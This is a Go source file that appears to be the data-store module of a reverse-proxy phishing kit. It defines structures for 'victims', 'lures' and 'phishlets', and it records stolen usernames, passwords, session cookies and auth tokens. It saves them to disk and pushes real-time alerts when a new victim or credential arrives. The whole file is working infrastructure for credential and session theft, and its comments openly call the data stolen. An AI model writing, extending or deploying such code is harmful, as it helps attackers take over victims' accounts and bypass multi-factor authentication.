package store

import (
	"encoding/json"
	"fmt"
	"os"
	"sync"
	"time"
)

// CapturedCredential represents a stolen username/password pair
type CapturedCredential struct {
	ID        string    `json:"id"`
	VictimID  string    `json:"victim_id"`
	Username  string    `json:"username"`
	Password  string    `json:"password"`
	SourceIP  string    `json:"source_ip"`
	UserAgent string    `json:"user_agent"`
	Phishlet  string    `json:"phishlet"`
	Timestamp time.Time `json:"timestamp"`
}

// CapturedSession represents a stolen authenticated session
type CapturedSession struct {
	ID        string            `json:"id"`
	VictimID  string            `json:"victim_id"`
	Cookies   map[string]string `json:"cookies"` // cookie_name → cookie_value
	Domain    string            `json:"domain"`
	SourceIP  string            `json:"source_ip"`
	UserAgent string            `json:"user_agent"`
	Phishlet  string            `json:"phishlet"`
	Timestamp time.Time         `json:"timestamp"`
	IsValid   bool              `json:"is_valid"` // Whether the session is still active
}

// Victim represents a unique target being phished
type Victim struct {
	ID          string              `json:"id"`
	LureID      string              `json:"lure_id"`
	IP          string              `json:"ip"`
	UserAgent   string              `json:"user_agent"`
	Phishlet    string              `json:"phishlet"`
	FirstSeen   time.Time           `json:"first_seen"`
	LastSeen    time.Time           `json:"last_seen"`
	Credentials []CapturedCredential `json:"credentials"`
	Sessions    []CapturedSession    `json:"sessions"`
	Tokens      map[string]string   `json:"tokens"` // Aggregated auth tokens
}

// Store manages all captured data with thread-safe access
type Store struct {
	mu       sync.RWMutex
	victims  map[string]*Victim
	filePath string

	// Channels for real-time notifications
	OnCredential chan CapturedCredential
	OnSession    chan CapturedSession
	OnNewVictim  chan Victim
}

// NewStore creates a new data store
func NewStore(filePath string) *Store {
	s := &Store{
		victims:      make(map[string]*Victim),
		filePath:     filePath,
		OnCredential: make(chan CapturedCredential, 100),
		OnSession:    make(chan CapturedSession, 100),
		OnNewVictim:  make(chan Victim, 100),
	}

	// Try to load existing data
	s.load()

	return s
}

// AddCredential stores a captured credential
func (s *Store) AddCredential(cred CapturedCredential) {
	s.mu.Lock()
	defer s.mu.Unlock()

	victim := s.getOrCreateVictim(cred.VictimID, cred.SourceIP, cred.UserAgent, cred.Phishlet)
	victim.Credentials = append(victim.Credentials, cred)
	victim.LastSeen = time.Now()

	s.save()

	// Non-blocking notification
	select {
	case s.OnCredential <- cred:
	default:
	}
}

// AddSession stores a captured session
func (s *Store) AddSession(sess CapturedSession) {
	s.mu.Lock()
	defer s.mu.Unlock()

	victim := s.getOrCreateVictim(sess.VictimID, sess.SourceIP, sess.UserAgent, sess.Phishlet)
	victim.Sessions = append(victim.Sessions, sess)
	victim.LastSeen = time.Now()

	// Merge tokens into the victim's aggregated token map
	if victim.Tokens == nil {
		victim.Tokens = make(map[string]string)
	}
	for k, v := range sess.Cookies {
		victim.Tokens[k] = v
	}

	s.save()

	// Non-blocking notification
	select {
	case s.OnSession <- sess:
	default:
	}
}

// GetVictim returns a victim by ID
func (s *Store) GetVictim(id string) (*Victim, bool) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	v, ok := s.victims[id]
	return v, ok
}

// GetAllVictims returns all victims
func (s *Store) GetAllVictims() []*Victim {
	s.mu.RLock()
	defer s.mu.RUnlock()

	result := make([]*Victim, 0, len(s.victims))
	for _, v := range s.victims {
		result = append(result, v)
	}
	return result
}

// GetStats returns aggregate statistics
func (s *Store) GetStats() map[string]interface{} {
	s.mu.RLock()
	defer s.mu.RUnlock()

	totalCreds := 0
	totalSessions := 0
	for _, v := range s.victims {
		totalCreds += len(v.Credentials)
		totalSessions += len(v.Sessions)
	}

	return map[string]interface{}{
		"total_victims":     len(s.victims),
		"total_credentials": totalCreds,
		"total_sessions":    totalSessions,
	}
}

// Reset clears all stored data
func (s *Store) Reset() {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.victims = make(map[string]*Victim)
	s.save()
}

func (s *Store) getOrCreateVictim(id, ip, ua, phishlet string) *Victim {
	victim, ok := s.victims[id]
	if !ok {
		victim = &Victim{
			ID:        id,
			IP:        ip,
			UserAgent: ua,
			Phishlet:  phishlet,
			FirstSeen: time.Now(),
			LastSeen:  time.Now(),
			Tokens:    make(map[string]string),
		}
		s.victims[id] = victim

		// Notify
		select {
		case s.OnNewVictim <- *victim:
		default:
		}
	}
	return victim
}

func (s *Store) save() {
	if s.filePath == "" {
		return
	}

	data, err := json.MarshalIndent(s.victims, "", "  ")
	if err != nil {
		return
	}
	os.WriteFile(s.filePath, data, 0600)
}

func (s *Store) load() {
	if s.filePath == "" {
		return
	}

	data, err := os.ReadFile(s.filePath)
	if err != nil {
		return
	}

	var victims map[string]*Victim
	if err := json.Unmarshal(data, &victims); err != nil {
		fmt.Printf("[!] Warning: Failed to parse existing store: %v\n", err)
		return
	}
	s.victims = victims
}
